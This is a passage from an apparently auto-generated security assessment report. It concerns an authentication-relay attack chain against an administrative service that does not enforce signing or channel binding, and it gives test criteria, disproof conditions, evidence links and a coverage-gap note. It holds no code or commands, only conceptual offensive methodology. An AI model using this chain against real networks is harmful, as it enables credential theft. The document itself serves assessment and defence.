that does not enforce signing or channel binding. Test the chain by confirming reachability from the untrusted segment and then confirming an authentication exchange that returns a credential, not by confirming the port is open.

- *Disproof:* Refuted if the administrative service is not reachable from the untrusted segment, or if the service enforces message signing or channel binding on every inbound authentication such that a relayed response is rejected; with either condition the exposure yields no credential and the chain stops at reconnaissance.
- *Evidence:* high_confidence — [academy.hackthebox.com](https://academy.hackthebox.com/course/preview/active-directory-ldap); [attack.mitre.org](https://attack.mitre.org/techniques/T1133/); [securelist.com](https://securelist.com/tr/network-anomaly-detection-in-kata/120892/)

## Impact

_No verified impact items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Coverage gap

These stages have no verified evidence and are therefore absent above: Reconnaissance signals, Validation, Known bypasses, Impact.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
